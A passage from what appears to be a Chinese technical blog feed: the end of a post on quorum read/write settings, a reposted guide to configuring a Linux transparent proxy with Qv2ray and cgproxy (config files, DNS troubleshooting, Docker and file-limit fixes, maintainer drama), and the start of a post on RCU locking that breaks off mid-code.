<p>在类似elasticsearch的系统中w和r的参数可以配置，读多写少的场景下就将w设置的大一点。一种很简单的复制方法是WARO（Write All Read One），其实这就是w&#x3D;n, r&#x3D;1情况下的一种特例。这个时候容错很低，只要有1个节点出问题，就会出现写入失败的情况，此时读就没法读到新值。</p>
<h2 id="边界条件"><a href="#边界条件" class="headerlink" title="边界条件"></a>边界条件</h2><p>读写都是随机均匀的，有节点不可用的情况:</p>
<p>n&#x3D;3, w&#x3D;2, r&#x3D;2时可以容忍一个副本节点故障<br>n&#x3D;5, w&#x3D;3, r&#x3D;3时可以容忍2个<br>一般设置w和r都是$\frac{n}{2}$ ，可以容忍$\frac{n}{2}$个问题副本（读写都在$\frac{n}{2}$个剩余节点上）</p>
<p>当对读到新值的要求不那么高时，可以设置$w+r&lt;n$, 此时有概率不满足一致性，有可能读到旧数据。不过这样可以提供更高的可用性，只有当可用节点低于$min(w,r)$时，才会无法读写（不可用）。这个一般被称为sloppy quorum</p>
<h2 id="Quorum的问题"><a href="#Quorum的问题" class="headerlink" title="Quorum的问题"></a>Quorum的问题</h2><p>TLDR, Quorum无法保证强一致性。</p>
<p>没有返回最新的值的情况：</p>
<p>1.并发写入，解决并发写冲突的一种办法是丢弃早的（覆盖掉，会产生新的问题）<br>2.同时读写，但一部分节点还没写完（如果对时效要求不是很高那这个没关系）<br>3.之前新值大于w,但是某个节点故障了，恢复的时候恢复了一个旧值，此时新值为w-1，此时读不到新值</p>
<p>那有什么办法来保证强一致性呢，当然是Paxos和Raft啦（逃</p>
<p>那么如何判断并发写呢，下一篇再说吧（逃</p>
]]></content>
      <categories>
        <category>Concurrency&amp;Go</category>
      </categories>
      <tags>
        <tag>quorum</tag>
      </tags>
  </entry>
  <entry>
    <title>『转载』使用Qv2ray+cgproxy配置透明代理（仅限Linux）</title>
    <url>/qv2ray-transparent-proxy/</url>
    <content><![CDATA[<p>从Qv2ray电报群里转来的，透明代理老有人问，感觉这个方案比tproxy等方案好，转出来。版权归Qv2ray及cgproxy所有</p>
<span id="more"></span>

<p>用的是这个项目：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NwcmluZ3pmeC9jZ3Byb3h5">https://github.com/springzfx/cgproxy<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="透明代理设置"><a href="#透明代理设置" class="headerlink" title="透明代理设置"></a>透明代理设置</h2><ol>
<li><p>在“首选项-入站设置”的下方启用透明代理选项。</p>
<ul>
<li>监听ipv4地址可填127.0.0.1或0.0.0.0，建议前者。若需双栈代理，则在监听ipv6地址填上<code>::1</code>（如果监听ipv4填了0.0.0.0则可不填）。</li>
<li>在“网络模式”中勾选需要透明代理的协议。模式选择“tproxy”。</li>
<li>如果希望在透明代理环境里让v2ray的内置dns接管本地dns，则勾选“dns拦截”。注意，在透明代理环境下，如果系统dns或v2ray的内置dns配置不当，可能导致系统无法解析域名从而无法正常上网。详见后文说明。</li>
</ul>
<p>如果是复杂配置，则需要手动添加相应的dokodemo-door入站。由于目前版本复杂配置并没有提供tproxy选项，因此tproxy模式需要通过编辑json来实现。</p>
</li>
<li><p>安装<code>cgproxy</code>软件</p>
<ul>
<li><code>cgproxy</code>软件已在archlinux, fedora 32, ubuntu 18.04, ubuntu 20.04, deepin 15.11, deepin v20 beta发行版中测试过。</li>
<li>Archlinux用户可直接在AUR上安装，deb或rpm系发行版用户可从<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NwcmluZ3pmeC9jZ3Byb3h5L3JlbGVhc2Vz">github<i class="fa fa-external-link-alt"></i></span>上下载安装包。非以上发行版用户，可自行从<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NwcmluZ3pmeC9jZ3Byb3h5">github<i class="fa fa-external-link-alt"></i></span>上获取代码自行编译。</li>
</ul>
</li>
<li><p>配置<code>cgproxy</code>，编辑<code>/etc/cgproxy/config.json</code>：</p>
<ul>
<li>在<code>cgroup_proxy</code>中括号里加上”&#x2F;“（包含引号），<code>port</code>改为Qv2ray首选项里的透明代理的端口。</li>
<li><code>cgproxy</code>默认配置是代理所有tcp和udp，ipv4和ipv6的流量，如果不希望代理其中的某种（些）流量，则将对应的<code>enable_xxx</code>改为false。注意这里的配置要和Qv2ray选项里的配置一致（如，Qv2ray选项里没有勾选udp，则这里务必把<code>enable_udp</code>改为false）。</li>
<li>如果希望当本机作为网关设备时为连接到本机网关的其他设备（如连接到本机开设的wifi热点的设备）也提供透明代理，则把<code>enable_gateway</code>改为true。</li>
</ul>
</li>
<li><p>（重要）透明代理的基本原理是拦截系统发出的所有流量，并将这些流量转到代理工具里，从而实现让系统所有流量都走代理的目的。此时，为了避免流量出现死循环（即代理工具发出的流量又转回到代理工具里），需要将代理工具排除在透明代理环境外面。有两种方式可以实现这一点：</p>
<ul>
<li><p>通过<code>execsnoop</code>监控代理工具的启动，并自动将其移至透明代理环境外面：</p>
<ul>
<li><code>cgproxy</code>软件自带<code>execsnoop</code>支持，以上<code>cgproxy</code>测试过的发行版均可支持。</li>
<li>编辑<code>/etc/cgproxy/config.json</code>，在<code>program_noproxy</code>中括号里加上”v2ray”,”qv2ray”（包含引号和逗号），以使<code>qv2ray</code>和<code>v2ray</code>发出的流量不经过透明代理。如果你的<code>v2ray</code>或<code>qv2ray</code>不在<code>PATH</code>里，则需要填写它们的绝对路径。</li>
</ul>
</li>
<li><p>在每次连接代理节点时，让<code>qv2ray</code>自己把自己移到透明代理环境外面：</p>
<ul>
<li><p>安装Qvplugin-Command插件，在插件设置里的“pre-connection”栏里加上一句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;cgnoproxy --pid <span class="subst">$(pgrep -x qv2ray)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>即可。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>（重要）如果启用了udp的透明代理（dns也是udp），则给v2ray二进制文件加上相应的特权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">setcap</span> <span class="string">&quot;cap_net_admin,cap_net_bind_service=ep&quot;</span> /path/of/your/v2ray</span><br></pre></td></tr></table></figure>

<p>否则udp的透明代理可能会出问题。</p>
</li>
<li><p>启动透明代理服务：<code>systemctl start cgproxy.service</code>或<code>systemctl enable --now cgproxy.service</code>。</p>
</li>
</ol>
<p>以上步骤完成后，透明代理应该能正常使用了。</p>
<h2 id="dns配置说明"><a href="#dns配置说明" class="headerlink" title="dns配置说明"></a>dns配置说明</h2><p>如果勾选了“dns拦截”，且启用了dns和udp的透明代理，则v2ray会拦截对系统dns的请求，并将其转发到v2ray的内置dns里，即让v2ray内置dns接管系统dns。但v2ray内置dns是会遵循路由规则的。</p>
<p>如果没勾选“dns拦截”，则v2ray虽然不会让内置dns接管系统dns，但如果启用了dns和udp的透明代理，则系统dns也会走透明代理进v2ray，并遵循v2ray的路由规则。</p>
<p>因此，在启用了dns和udp的透明代理时，若系统dns或v2ray的内置dns配置不当，可能导致dns请求发不出去，从而影响正常上网。</p>
<p>由于qv2ray默认的路由规则是绕过国内ip，国外ip均走代理。在这个情形中，以下两个配置是典型的有问题的dns配置方式：</p>
<ul>
<li>配置了国外普通dns作为首选，但代理本身不支持udp（此时dns查询的udp流量出不去，dns无法查询）</li>
<li>配置了使用域名的doh作为首选（此时doh的域名无法解析，从而doh也无法使用）</li>
</ul>
<p>一般而言，如果并不在意将dns查询发给谁，那么，在绕过国内ip的情况下，只需要配置一个国内普通dns作为首选即可保证不会出问题。若代理本身不支持udp，又希望使用国外dns，则可以考虑使用使用ip的doh（如<code>https://1.1.1.1/dns-query</code>等）。</p>
<p>如果需要更复杂的dns配置，建议参考<span class="exturl" data-url="aHR0cHM6Ly93d3cudjJyYXkuY29tL2NoYXB0ZXJfMDIvMDRfZG5zLmh0bWw=">上游文档<i class="fa fa-external-link-alt"></i></span>，并选择合适的不会影响正常上网的dns配置。</p>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ul>
<li><p>启用透明代理后无法访问任何外网，且v2ray的cpu占用率飙升</p>
<p>可能是流量陷入死循环了，检查第4步有没有正确配置。如果配置没问题，执行<code>systemctl status cgproxy.service</code>看下有没有诸如<code>info: process noproxy pid msg: xxx</code>之类的输出。如果没有，则说明cgproxy软件或execsnoop没有正常工作。注意cgproxy软件需要cgroup v2。</p>
<p>尝试退出qv2ray，随后在终端里执行<code>cgnoproxy qv2ray</code>看是否恢复正常，如恢复正常，说明cgproxy正常工作，只是execsnoop没有正常工作。由于execsnoop一定程度上依赖于内核，非上述cgproxy测试过的发行版用户，建议使用第4步中的第2种方法。另外，对kde用户，5.19+版的plasma会给从krunner里启动的程序额外设置cgroup，尽管cgproxy软件考虑到了这一点，但仍有极少数场合可能出现plasma设置的cgroup覆盖掉了cgproxy设置的cgroup的情况，此时通常重启一下qv2ray即可。</p>
</li>
<li><p>启用透明代理后，无法访问（部分）域名</p>
<p>可能是dns无法解析（部分）域名。一般这种故障只发生在启用了dns及udp透明代理的时候。</p>
<p>终端里执行<code>dig 无法访问的域名</code>看下报什么错：</p>
<ul>
<li><p>若出现类似<code>reply from unexpected source: 192.168.0.100#42050, expected 8.8.8.8#53</code>的报错，则检查第5步的有没有正确配置。</p>
</li>
<li><p>若出现类似<code>connection timed out; no servers could be reache</code>的报错，则说明dns查询的流量出不去，此时往往是系统dns或v2ray内置dns配置不当。请检查是否出现了前文提到的几种不当配置。如果没有勾选“dns拦截”，则此时v2ray虽然不会用内置dns接管系统dns，但它仍然会让系统dns走透明代理，从而遵循v2ray的路由规则，此时需要检查系统dns是否是前文提到的那几种不当配置。</p>
</li>
</ul>
</li>
<li><p>能不能分应用代理（如，下载BT时不能走代理）</p>
<p>对于本机的程序，可以，可通过两种方式实现：</p>
<ul>
<li>通过<code>cgnoproxy</code>实现：如，在命令行中执行<code>cgnoproxy qbittorrent</code>，启动的qbittorrent程序就不会走透明代理。又如，在命令行中执行<code>cgnoproxy --pid 12345</code>，执行之后pid为12345的程序就不再走透明代理。这种方式可支持任何应用。</li>
<li>通过<code>/etc/cgproxy/config.json</code>实现：在配置里的<code>program_noproxy</code>中括号里加上相应的应用即可。这种方式只支持可执行文件，不支持各种脚本。注意修改<code>config.json</code>之后，需要重启cgproxy服务才能生效，执行<code>systemctl restart cgproxy.service</code>即可。</li>
</ul>
<p>对于当本机作为网关设备时为连接到本机网关的其他设备，不行，那些设备的所有流量（到本机的流量除外）都必然会走代理。</p>
</li>
<li><p>透明代理环境中响应速度变慢</p>
<p>由于iptables是在域名解析成ip之后，才对相应的流量进行重定向。因此，在透明代理环境中，访问一个域名s可能会需要解析至少2次dns（系统解析一次，重定向到v2ray之后v2ray分流模块再解析一次）。因此，响应理论上是会变慢一点的，变慢的幅度取决于系统dns及v2ray的dns的响应速度。</p>
</li>
</ul>
<h2 id="自己写的更新和群友遇到的一些问题"><a href="#自己写的更新和群友遇到的一些问题" class="headerlink" title="自己写的更新和群友遇到的一些问题"></a>自己写的更新和群友遇到的一些问题</h2><h3 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemd-cgls /noproxy.slice <span class="comment"># 检查一下被排除代理的应用</span></span><br><span class="line">cgproxy curl -sSLv https://www.google.com/ <span class="comment"># 开着代理连一下谷歌试试，检查一下你的透明代理是不是好的</span></span><br><span class="line">cgnoproxy firefox <span class="comment"># 临时关掉透明代理运行某个应用（比如Firefox），检查一下是不是透明代理造成的问题</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker和透明代理冲突的问题"><a href="#Docker和透明代理冲突的问题" class="headerlink" title="Docker和透明代理冲突的问题"></a>Docker和透明代理冲突的问题</h3><p>这也是一个频繁被问到的问题</p>
<blockquote>
<p>你是装了某些可能会破坏 cgroup matching 的东西吗<br>比如 docker 之类的肮脏程序<br>docker 不仅会破坏cgroup matching<br>把网络搞炸<br>docker 还有 hairpin nat<br>巨坑</p>
</blockquote>
<p>我自己试了一下是这样的</p>
<p>在<code>systemctl enable docker</code>后没有问题</p>
<p>这个时候我没把当前用户添加到个人用户组，不能直接使用Docker，需要<code>sudo docker ...</code><br>在我把Docker添加到当前用户组后出问题了，重启后qv2ray和clash等失效了，延迟测试全部显示0ms</p>
<p>报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2020/11/19 20:34:03 192.168.1.105:58398 accepted tcp:211.72.35.152:80 [outBound_PROXY] </span><br><span class="line"></span><br><span class="line">2020/11/19 20:34:10 [Warning] [4118491953] v2ray.com/core/app/proxyman/outbound: failed to process outbound traffic &gt; v2ray.com/core/proxy/vmess/outbound: failed to find an available destination &gt; v2ray.com/core/common/retry: [v2ray.com/core/transport/internet/websocket: failed to dial WebSocket &gt; v2ray.com/core/transport/internet/websocket: failed to dial to (ws://feec8af.rf.cloudflare.systems/s/feec8af.fm.apple.com:29306):  &gt; <span class="built_in">read</span> tcp 192.168.1.105:58370-&gt;211.72.35.152:80: i/o <span class="built_in">timeout</span> v2ray.com/core/transport/internet/websocket: failed to dial WebSocket &gt; v2ray.com/core/transport/internet/websocket: failed to dial to (ws://feec8af.rf.cloudflare.systems/s/feec8af.fm.apple.com:29306):  &gt; dial tcp: operation was canceled] &gt; v2ray.com/core/common/retry: all retry attempts failed</span><br><span class="line">2020/11/19 20:34:10 [Warning] v2ray.com/core/transport/internet/tcp: failed to accepted raw connections &gt; accept tcp 127.0.0.1:12345: accept4: too many open files</span><br><span class="line">2020/11/19 20:34:10 192.168.1.105:58946 accepted tcp:211.72.35.152:80 [outBound_PROXY]</span><br></pre></td></tr></table></figure>

<p>一个办法是用docker的时候加<code>sudo</code>以root用户运行。</p>
<p>另一个解决办法见：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NwcmluZ3pmeC9jZ3Byb3h5L2lzc3Vlcy8=">https://github.com/springzfx/cgproxy/issues/<i class="fa fa-external-link-alt"></i></span></p>
<p>编辑<code>/etc/default/grub</code>，<br>添加<code>cgroup_no_v1=net_cls,net_prio</code> 到<code>GRUB_CMDLINE_LINUX_DEFAULT</code>中,<br>然后更新grub，重启<br>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;text cgroup_no_v1=net_cls,net_prio&quot;</span></span><br><span class="line">sudo grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<p>但是，加了这些参数经常也不太好用。</p>
<blockquote class="blockquote-center">
<p>最简单的办法，扬了 docker，换 podman &#x2F; podman-docker</p>

</blockquote>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Syu podman-docker</span><br></pre></td></tr></table></figure>

<p>或者安装podman，然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> docker=podman</span><br></pre></td></tr></table></figure>

<p>然后你需要编辑<code>/etc/subuid</code>和<code>/etc/subgid</code>加上<code>podman:165536:4096</code>，然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usermod --add-subuids 165536-169631 --add-subgids 165536-169631 yourusername</span><br></pre></td></tr></table></figure>

<p>不然会报错，没法pull images</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ERRO[0000] cannot find UID/GID for user zjk: open /etc/subuid: no such file or directory - check rootless mode in man pages.</span><br></pre></td></tr></table></figure>

<h3 id="pacman更新报错"><a href="#pacman更新报错" class="headerlink" title="pacman更新报错"></a>pacman更新报错</h3><p>本来都是好的，突然有一次更新问题了。浏览器等访问都没有问题，怀疑是透明代理的问题。Qv2ray输出看不到异常。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:: Synchronizing package databases...</span><br><span class="line">error: failed retrieving file &#x27;core.db&#x27; from mirrors.uestc.cn : Failed to connect to mirrors.uestc.cn port 80: Connection timed out</span><br><span class="line">error: failed to update core (download library error)</span><br><span class="line">error: failed to synchronize all databases</span><br><span class="line">error installing repo packages</span><br></pre></td></tr></table></figure>

<p>使用<code>cgnoproxy yay -Syu</code> 看了一下，果然。<br>然后在cproxy中将pacman和yay加入noproxy组中。编辑<code>/etc/cgproxy/config.json</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span><span class="string">&quot;For usage, see https://github.com/springzfx/cgproxy&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">12345</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;program_noproxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;v2ray&quot;</span><span class="punctuation">,</span> <span class="string">&quot;qv2ray&quot;</span><span class="punctuation">,</span> <span class="string">&quot;yay&quot;</span><span class="punctuation">,</span> <span class="string">&quot;pacman&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;program_proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cgroup_noproxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/system.slice/v2ray.service&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cgroup_proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_gateway&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_dns&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_udp&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_tcp&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_ipv4&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;enable_ipv6&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;table&quot;</span><span class="punctuation">:</span> <span class="number">10007</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;fwmark&quot;</span><span class="punctuation">:</span> <span class="number">39283</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="透明代理和其他的代理设置冲突"><a href="#透明代理和其他的代理设置冲突" class="headerlink" title="透明代理和其他的代理设置冲突"></a>透明代理和其他的代理设置冲突</h3><p>比如SwitchyOmega、Firefox的代理设置</p>
<p>开了透明代理，理论上不需要对应用单独指定代理了，直接把SwitchyOmega关掉或者规则选 Direct，Firefox的代理设置也填不使用代理</p>
<h3 id="报错-too-many-open-files"><a href="#报错-too-many-open-files" class="headerlink" title="报错 too many open files"></a>报错 too many open files</h3><p>报这种错:</p>
<blockquote>
<p>2021&#x2F;03&#x2F;11 22:32:32 [Warning] github.com&#x2F;v2fly&#x2F;v2ray-core&#x2F;v4&#x2F;transport&#x2F;internet&#x2F;tcp: failed to accepted raw connections &gt; accept tcp 127.0.0.1:8889: accept4: too many open files</p>
</blockquote>
<p>这个在开启UDP透明代理的时候常见, 可能是文件大小限制,也可能是你配置错误出现循环转发,比如<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3YycmF5L3YycmF5LWNvcmUvaXNzdWVzLzE1NjM=">这个issue<i class="fa fa-external-link-alt"></i></span></p>
<p>编辑<code>/usr/lib/systemd/system/v2ray.service</code> 或 <code>/etc/systemd/system/v2ray.service</code></p>
<p>加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">LimitNPROC=500</span><br><span class="line">LimitNOFILE=1000000</span><br></pre></td></tr></table></figure>

<p>然后: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart v2ray</span><br></pre></td></tr></table></figure>

<p>参考<span class="exturl" data-url="aHR0cHM6Ly90b3V0eXJhdGVyLmdpdGh1Yi5pby9hcHAvdHByb3h5Lmh0bWwjJUU1JTg1JUI2JUU0JUJCJTk2">v2ray配置指南的透明代理部分<i class="fa fa-external-link-alt"></i></span></p>
<p>或者修改<code>/etc/security/limits.conf</code>在末尾添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user   soft   nofile    40690</span><br><span class="line">user   hard   nofile    40690</span><br></pre></td></tr></table></figure>

<p>user改为你的用户名(<code>echo $USER</code>查看),或者想为所有用户设置就改为<code>*</code>（不推荐）</p>
<h2 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h2><h3 id="其他平台和其他方案"><a href="#其他平台和其他方案" class="headerlink" title="其他平台和其他方案"></a>其他平台和其他方案</h3><p>目前Linux透明代理的绝大多数方案都是基于iptables（nftables）的<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3YycmF5QS92MnJheUE=">v2raya<i class="fa fa-external-link-alt"></i></span>有自带的透明代理，看起来设置比这个还要简单一些。<br>如果是软路由的透明代理，那Openwrt有很多成熟的方案。如果是非桌面版，请考虑软路由的ssr plus、clash或者v2raya等透明代理方案（或者自己写iptables规则）</p>
<p>Win用户推荐使用Proxifier达到类似的效果</p>
<h3 id="Qv2ray的gcc和rprx的纷争"><a href="#Qv2ray的gcc和rprx的纷争" class="headerlink" title="Qv2ray的gcc和rprx的纷争"></a>Qv2ray的gcc和rprx的纷争</h3><p>gcc几个月前宣布隐退，当时很多人（包括我）都在期待gcc回来。不过在前一阵gcc和rprx等人的争吵中，gcc被鸭鸭移除了权限并踢了出去。<br>为什么我要说这个事情呢？cgproxy已经在一年多以前停止维护了。现在Qv2ray的开发在gcc走后也大幅放缓了，而透明代理功能Qv2ray维护者表示这是祖传代码不会继续更新，所以————————（当然现在的版本已经够用了，继续用下去没有问题）</p>
<p>ps：这件事上我是倾向于支持gcc的。之前我对鸭鸭和gcc印象比较好，很不怎么喜欢 rprx x 。<br>这件事我不支持鸭鸭的做法，gcc作为qv2ray的创始人和主要贡献者，虽然隐退了，应该有对这个项目处置的权利（虽然qv2ray是一个社区项目，然而90%的贡献都是gcc的）。我心目中比较好的处理方式是Qv2ray分家，fork并改名出一个Qxray来作为支持xray的版本（就像Project V、v2fly和Project X那样）。<br>Qv2ray是Linux下这方面为数不多很棒的GUI图形化桌面软件（其他的有Trojan-Qt5,大都先于Qv2ray凉了），唉，Linux桌面的图形化软件前路迢迢  </p>
<h3 id="关于Qv2ray停止维护的事"><a href="#关于Qv2ray停止维护的事" class="headerlink" title="关于Qv2ray停止维护的事"></a>关于Qv2ray停止维护的事</h3><p>现在star最多的那个组织<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1F2MnJheQ==">Qv2ray<i class="fa fa-external-link-alt"></i></span> 停止维护了，意料之中吧。这件事我不想多评价了，我要评价肯定忍不住对rprx的脏话。下面简单说一下qv2ray的事。</p>
<p>如果你想用老版本的Qv2ray（Qv2ray 3 以前）</p>
<p>目前AUR里面的qv2ray 2.7.0 版本是无法正常使用插件的。如果想使用可以自行降级到2.6然后用插件。</p>
<p>更推荐的方式是换<span class="exturl" data-url="aHR0cHM6Ly9hdXIuYXJjaGxpbnV4Lm9yZy9wYWNrYWdlcy9xdjJyYXktZGV2LWdpdC8=">qv2ray-dev-git<i class="fa fa-external-link-alt"></i></span> (这个也停止维护了，是<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1F2MnJheS9RdjJyYXk=">Qv2ray&#x2F;qv2ray<i class="fa fa-external-link-alt"></i></span>的打包) 这个要新一点（众所周知dev版本比稳定版稳定）</p>
<p>上面两个版本足够正常使用，但是都停止更新了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S qv2ray-dev-git qv2ray-plugin-command-dev-git </span><br></pre></td></tr></table></figure>

<p>如果你想用gcc还在开发中的新版的Qv2ray 3.0，可以自行编译或下载release（完全移除了xray的支持，gcc原班人马开发维护，是的，你们永远喜欢的gcc又回来了）。这个版本变化比较大，迁移到了Qt6，重写了不少东西，插件也不通用，只是界面看起来一样而已。</p>
<p>下面是Gcc的新版本Qv2ray，<strong>Conflict With xray</strong></p>
<p>Archlinux可以用<span class="exturl" data-url="aHR0cHM6Ly9hdXIuYXJjaGxpbnV4Lm9yZy9wYWNrYWdlcy9xdjJyYXktc3RhdGljLWJpbi1uaWdodGx5Lw==">qv2ray-static-bin-nightly<i class="fa fa-external-link-alt"></i></span>这个包，想追最新的可以用<code>qv2ray-git</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S qv2ray-static-bin-nightly</span><br></pre></td></tr></table></figure>

<h3 id="关于grpc"><a href="#关于grpc" class="headerlink" title="关于grpc"></a>关于grpc</h3><p>grpc经常进行不兼容的更新（对，小版本号也会有破坏性改动）</p>
<p>所以经常出现滚动更新grpc后，qv2ray就炸掉不能用了（这个时候建议降级grpc先应急）</p>
<p>或者你依赖grpc的其他包不多的话，可以考虑直接锁grpc的版本。<code>sudo downgrade grpc</code></p>
<p>事实上不仅是qv2ray会随着grpc的更新出问题，其他的包也会，比如sysdig。经常出现grpc版本更新的但是API变了，其他依赖grpc的包没有更改API还是用老版本就出事了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error: failed to prepare transaction (could not satisfy dependencies)</span><br><span class="line">:: installing grpc (1.41.0-1) breaks dependency &#x27;libgrpc++_unsecure.so=1.39-64&#x27; required by sysdig</span><br><span class="line">error installing repo packages</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>qv2ray</tag>
        <tag>cgproxy</tag>
        <tag>transparent-proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>RCU，读多写少的锁实现</title>
    <url>/rcu-and-userspace-rcu/</url>
    <content><![CDATA[<p>之前有很多场景都是读多写少，而且不怎么需要实时。一直比较好奇应该用什么锁，读写锁总是不满意，最近看6.S081看到rcu，咦，是我想要找的东西。</p>
<span id="more"></span>

<h2 id="水平超低预警"><a href="#水平超低预警" class="headerlink" title="水平超低预警"></a>水平超低预警</h2><p>一年前就开始看DDIA和做6.824 Raft 那些东西，不过当时水平太菜了。一直不太敢写并发和分布式相关的东西。并发有很多反直觉的地方，我写出来总是踩坑。好在golang的channel什么的写起来都很舒服。<br>一年过去了，自认水平总没有当初那么菜了，鼓起勇气开始写一点关于并发和Go的东西，所以新开了一个分类。（结果发现一年前看的好多东西都忘了。。。记住的好多也是错的。。。）<br><strong>这个系列肯定有很多丢人现眼的地方，路过的朋友看到我说的不对的地方请在评论告诉我</strong></p>
<h2 id="用途和概念"><a href="#用途和概念" class="headerlink" title="用途和概念"></a>用途和概念</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p><img src="/rcu-and-userspace-rcu/2022-01-08-22-40-18.png"></p>
<p>我们可以用读写锁来保证读取和写入的一致性。在大量读取、少量写入的场景，读写锁的效率会比较低，用RCU可以提高读的性能。使用RCU，读的时候可以不加锁，也不用去管什么内存屏障和原子性了，直接读就完事了。<br>而且如果写入很少，几乎没有同时写入的情况，RCU的写入速度是很快的，写并不一定比读写锁慢（Grace Period其实很短）</p>
<p><img src="/rcu-and-userspace-rcu/2022-01-08-22-34-22.png"></p>
<p>典型场景包括：路由表、DNS查询、内核</p>
<blockquote>
<p>The basic form of such “Pure RCU” designs is as follows:</p>
<ol>
<li>Make a change, for example, to the way that the OS reacts to an NMI.</li>
<li>Wait for all pre-existing read-side critical sections to completely finish (for example,by using the synchronize_sched() primitive). The key observation here is that subsequent RCU read-side critical sections are guaranteed to see whatever change was made.</li>
<li>Clean up, for example, return status indicating that the change was successfully made</li>
</ol>
</blockquote>
<p>在内核里面主要是处理中断、代替读写锁、订阅发布、代替引用计数等。在内核中应用的介绍可以看文章：<span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi44MjgvMjAxOC9yZWFkaW5ncy9yY3UtZGVjYWRlLWxhdGVyLnBkZg==">RCU Usage In the Linux Kernel: One Decade Later<i class="fa fa-external-link-alt"></i></span><br>下面是一个NMI的例子（不可打断中断应该也不会被抢占，正适合RCU）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">rcu_list_t</span> nmi_list;</span><br><span class="line"><span class="type">spinlock_t</span> nmi_list_lock;</span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_nmi</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  rcu_read_lock();</span><br><span class="line">  rcu_list_for_each(&amp;nmi_list, <span class="type">handler_t</span> cb)</span><br><span class="line">    cb();</span><br><span class="line">  rcu_read_unlock();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_nmi_handler</span><span class="params">(<span class="type">handler_t</span> cb)</span></span><br><span class="line">&#123;</span><br><span class="line">  spin_lock(&amp;nmi_list_lock);</span><br><span class="line">  rcu_list_add(&amp;nmi_list, cb);</span><br><span class="line">  spin_unlock(&amp;nmi_list_lock);</span><br><span 